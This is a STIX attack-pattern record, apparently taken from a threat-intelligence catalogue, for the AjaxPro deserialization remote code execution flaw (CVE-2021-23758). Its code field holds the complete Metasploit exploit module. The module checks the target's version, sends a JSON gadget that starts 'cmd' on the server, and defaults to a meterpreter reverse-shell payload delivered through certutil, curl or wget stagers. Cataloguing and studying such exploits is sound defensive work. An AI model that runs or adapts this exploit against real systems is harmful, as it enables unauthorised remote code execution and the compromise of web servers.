{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5480f7a0-1c6c-4f69-937b-1eb9571b5219",
    "created": "2024-08-14T16:54:35.121117Z",
    "modified": "2024-08-14T16:54:35.121129Z",
    "name": "AjaxPro Deserialization Remote Code Execution",
    "description": " This module leverages an insecure deserialization of data to get remote code execution on the target OS in the context of the user running the website which utilized AjaxPro.  To achieve code execution, the module will construct some JSON data which will be sent to the target. This data will be deserialized by the AjaxPro JsonDeserializer and will trigger the execution of the payload.  All AjaxPro versions prior to 21.10.30.1 are vulnerable to this issue, and a vulnerable method which can be used to trigger the deserialization exists in the default AjaxPro namespace.  AjaxPro 21.10.30.1 removed the vulnerable method, but if a custom method that accepts a parameter of type that is assignable from `ObjectDataProvider` (e.g. `object`) exists, the vulnerability can still be exploited.  This module has been tested successfully against official AjaxPro on version 7.7.31.1 without any modification, and on version 21.10.30.1 with a custom vulnerable method added. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ajaxpro_deserialization_rce.rb",
            "external_id": "ajaxpro_deserialization_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-23758"
        },
        {
            "source_name": "reference",
            "url": "https://mogwailabs.de/en/blog/2022/01/vulnerability-spotlight-rce-in-ajax.net-professional/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'AjaxPro Deserialization Remote Code Execution',\n        'Description' => %q{\n          This module leverages an insecure deserialization of data to get\n          remote code execution on the target OS in the context of the user\n          running the website which utilized AjaxPro.\n\n          To achieve code execution, the module will construct some JSON data\n          which will be sent to the target. This data will be deserialized by\n          the AjaxPro JsonDeserializer and will trigger the execution of the\n          payload.\n\n          All AjaxPro versions prior to 21.10.30.1 are vulnerable to this\n          issue, and a vulnerable method which can be used to trigger the\n          deserialization exists in the default AjaxPro namespace.\n\n          AjaxPro 21.10.30.1 removed the vulnerable method, but if a custom\n          method that accepts a parameter of type that is assignable from\n          `ObjectDataProvider` (e.g. `object`) exists, the vulnerability can\n          still be exploited.\n\n          This module has been tested successfully against official AjaxPro on\n          version 7.7.31.1 without any modification, and on version 21.10.30.1\n          with a custom vulnerable method added.\n        },\n        'Author' => [\n          'Hans-Martin M\u00fcnch (MOGWAI LABS)', # Discovery\n          'Jemmy Wang' # MSF Module\n        ],\n        'References' => [\n          ['CVE', '2021-23758'],\n          ['URL', 'https://mogwailabs.de/en/blog/2022/01/vulnerability-spotlight-rce-in-ajax.net-professional/']\n        ],\n        'DisclosureDate' => '2021-12-03',\n        'License' => MSF_LICENSE,\n        'Platform' => ['windows'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/meterpreter/reverse_tcp',\n                'CMDSTAGER::FLAVOR' => 'certutil'\n              },\n              'CmdStagerFlavor' => %w[vbs certutil debug_write debug_asm tftp psh_invokewebrequest curl wget lwp-request]\n            }\n          ],\n        ],\n        'DefaultOptions' => { 'WfsDelay' => 30 },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [SCREEN_EFFECTS, IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path to AjaxPro Handler', '/ajaxpro/']),\n      OptString.new('Namespace', [true, 'Namespace of vulnerable method', 'AjaxPro.Services.ICartService,AjaxPro.2']),\n      OptString.new('Method', [true, 'Name of vulnerable method', 'AddItem']),\n      OptString.new('Parameter', [true, 'Name of vulnerable parameter', 'item'])\n    ])\n\n    @ajax_pro = { ID: 'AjaxPro' }\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'core.ashx'),\n      'keep_cookies' => true\n    )\n    unless res\n      return CheckCode::Unknown(\"Target did not respond to #{normalize_uri(target_uri.path, 'core.ashx')}\")\n    end\n\n    unless res.code == 200 && res.headers['Content-Type'].include?('application/x-javascript')\n      return CheckCode::Safe('Is not AjaxPro?')\n    end\n\n    unless (cap = res.body.match(/ID: ?\"(\\S+?)\",/).captures)\n      return CheckCode::Detected('Failed to get AjaxPro ID.')\n    end\n\n    @ajax_pro[:ID] = cap[0]\n\n    unless (cap = res.body.match(/version: ?\"(\\S+?)\",/).captures)\n      return CheckCode::Detected('Failed to get AjaxPro version.')\n    end\n\n    @ajax_pro[:version] = cap[0]\n\n    if Rex::Version.new(@ajax_pro[:version]) >= Rex::Version.new('21.10.30.1')\n      return CheckCode::Safe(\"AjaxPro version #{@ajax_pro[:version]} is not vulnerable.\")\n    end\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, datastore['Namespace'] + '.ashx'),\n      'keep_cookies' => true\n    )\n    unless res\n      return CheckCode::Appears('Failed to check if the target method exists.')\n    end\n\n    unless res.code == 200 && res.body.match(/#{datastore['Method']}: ?function ?\\((\\S+?, ?)*#{datastore['Parameter']}(, ?\\S+?)*\\) ?\\{/)\n      return CheckCode::Appears(\"But method '#{datastore['Method']}' with parameter '#{datastore['Parameter']}' was not found in namespace '#{datastore['Namespace']}'\")\n    end\n\n    CheckCode::Appears(\"Confirmed target method exists and the AjaxPro version (#{@ajax_pro[:version]}) is vulnerable.\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n    json_post_data = JSON.generate(\n      {\n        \"#{datastore['Parameter']}\": {\n          __type: 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',\n          MethodName: 'Start',\n          ObjectInstance: {\n            __type: 'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',\n            StartInfo: {\n              __type: 'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',\n              FileName: 'cmd',\n              Arguments: \"/c #{cmd}\"\n            }\n          }\n        }\n      }\n    )\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, datastore['Namespace'] + '.ashx'),\n      'ctype' => 'text/plain; charset=utf-8',\n      'headers' => { \"X-#{@ajax_pro[:ID]}-Method\" => datastore['Method'] },\n      'data' => json_post_data\n    })\n    unless res\n      fail_with(Failure::Unreachable, \"Request to #{normalize_uri(target_uri.path, datastore['Namespace'] + '.ashx')} failed.\")\n    end\n\n    unless res.code == 200\n      fail_with(Failure::Unknown, \"Failed to execute command. Server returned #{res.code} status.\")\n    end\n  end\n\n  def exploit\n    case target['Type']\n    when :win_cmd\n      execute_command(payload.encoded)\n    when :win_dropper\n      execute_cmdstager(background: true, delay: 1)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-12-03",
    "x_mitre_platforms": [
        "win'"
    ]
}